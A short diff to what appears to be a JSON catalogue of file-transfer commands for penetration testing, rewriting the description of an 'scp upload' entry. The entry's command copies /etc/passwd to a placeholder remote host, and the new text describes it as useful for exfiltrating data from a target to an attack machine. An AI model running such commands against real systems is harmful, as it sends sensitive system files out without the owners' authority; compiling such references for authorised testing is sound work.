@@ -201,9 +201,9 @@
       "label": "POST upload - multi-file (HTTPS)"
     },
     {
-      "description": "SCP upload (push file to remote)",
       "command": "scp /etc/passwd <user>@<ip>:/home/<user>/",
-      "label": "scp upload"
+      "label": "scp upload",
+      "description": "Transfers files over SSH using scp. Securely copies files between your attack machine and the target - useful for uploading tools or exfiltrating data."
     },
     {
       "description": "Alternative web upload - python3 requests one-liner",
